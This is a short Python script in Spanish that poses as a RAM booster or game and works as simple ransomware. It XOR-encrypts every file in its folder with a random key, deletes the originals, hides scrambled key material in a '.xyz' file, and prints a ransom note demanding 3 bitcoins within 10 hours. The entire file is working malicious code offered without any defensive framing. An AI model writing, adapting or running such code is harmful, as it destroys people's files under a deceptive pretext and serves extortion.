# -*- coding: utf-8 -*-
from sys import argv,version_info
import os
assert version_info[0] == 3, 'USA PYTHON 3'
print('Aumentando memoria RAM, espera...')



def xx(x):
 """
 Hace un XOR entre cada uno de los bytes de el archivo
 x pasado como parametro y el arreglo aleatorio de bytes k
 """

 with open(x + '.enc','wb') as z:
  z.write((lambda x:bytes([x[i] ^ k[i % 16] for i in range(len(x))]))(open(x,'rb').read()))
 os.remove(x)


"""
X es la lista que almacena los nombres (con extension) de
los archivos que se encuantran en las carpetas
"""
_,_,x = next(os.walk('./'))
#x.remove(argv[0])
x.remove("juego.py")

"""
k son bytes aleatorios
"""
k = os.urandom(16)
#k = b'\xae\xc31\x96\xb8\x80\x00p:\xaa_q\x05\x89L\xcd'
print("k : " + str(k))

list(map(xx,x))

"""
d y k son enteros aleatorios muy grandes
"""
d,k = map(lambda x:int.from_bytes(k,'big'),[0xba,0xbe])

print("d : " + str(d))
print("k1 : " + str(k))


"""
c es un entero aleatorio
"""
#c = b'\x99'[0]|(1 << 7)
c = os.urandom(1)[0]|(1 << 7)
print("c : " + str(c))


"""
k es un entero muy grande
"""
k = d * k % (1 << c)
print("k2 : " + str(k))

"""
d y k son muchos bytes
"""
d,k = map(lambda x:x.to_bytes(32,'big'),[d,k])
print("d2 : " + str(d))
print("k3 : " + str(k))

"""
c es el previo numero c en bytes
"""
c = bytes([c])
print("c2 : " + str(c))

y = '\x2e' + '\x78' + '\x79\x7a' #.xyz
with open(y,'wb') as z:
    z.write(c + d + k)
 
print('\n😈😈😈😈 Archivos encriptados JAJAJAJA 😈😈😈😈\nDame 3 bitcoins en 10 horas o morirán para siempre')



